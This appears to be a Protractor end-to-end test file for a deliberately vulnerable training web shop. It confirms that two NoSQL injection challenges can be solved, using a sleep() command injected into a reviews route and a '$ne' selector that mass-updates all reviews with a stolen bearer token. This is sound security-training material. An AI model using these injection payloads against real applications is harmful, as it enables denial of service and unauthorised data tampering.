const config = require('config')

describe('/#/search', () => {
  beforeEach(() => {
    browser.get('/#/search')
  })

  describe('challenge "NoSql Command Injection"', () => {
    protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})

    it('should be possible to inject a command into the get route', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript('var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { console.log("Success"); } }; xhttp.open("GET","http://localhost:3000/rest/product/sleep(1000)/reviews", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.send();')
      browser.driver.sleep(5000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 1' })
  })

  describe('challenge "NoSql Injection"', () => {
    it('should be possible to inject a selector into the update route', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript('var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { console.log("Success"); } }; xhttp.open("PATCH","http://localhost:3000/rest/product/reviews", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization", `Bearer ${localStorage.getItem("token")}`); xhttp.send(JSON.stringify({ "id": { "$ne": -1 }, "message": "NoSQL Injection!" }));') // eslint-disable-line
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 2' })
  })
})
